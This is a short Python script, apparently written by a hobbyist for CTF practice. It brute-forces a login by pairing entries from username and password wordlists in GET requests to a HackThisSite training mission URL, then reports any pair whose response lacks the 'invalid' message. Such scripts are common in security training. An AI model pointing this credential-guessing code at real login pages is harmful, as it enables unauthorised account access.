#!/usr/bin/python3

"""
Bruteforcing Script 
by burchthehacker

Created a bruteforcing script to assist with bruteforcing CTFs.
This is the basic script that I will develop.

How to use:

Go to burp suite and look at your post request in repeater.
Right click on the request and "Change request method".
This will change the POST request to GET.
Then change the data below where I have commented # change.

"""

import requests

f = open("<your file path>", "r")  # change <your file path>
data = f.readlines()
username_wordlist = []
for i in data:
    username_wordlist.append(i.replace("\n", ""))
f.close()

f = open("<your file path>", "r")  # change <your file path>
data = f.readlines()
password_wordlist = []
for i in data:
    password_wordlist.append(i.replace("\n", ""))
f.close()

invalid_string = "Invalid username/password."  # change to the invalid string

found = []

for password in password_wordlist:
    for username in username_wordlist:
        print("Attempt:", username, ":", password)
        response = requests.get(url="https://www.hackthissite.org/missions/realistic/10/staff.php?username={}&password={}".format(username, password), data={
            "username": username, "password": password}, cookies={"HackThisSite": "<your cookie>"},)  # change url and add your session cookies
        if response.text.find(invalid_string) == -1:
            print()
            print("FOUND: " + username, ":", password)
            print()
            found.append([username, password])
            username_wordlist.remove(username)

print()
print("Search Complete")
print("Found credentials for:", found)

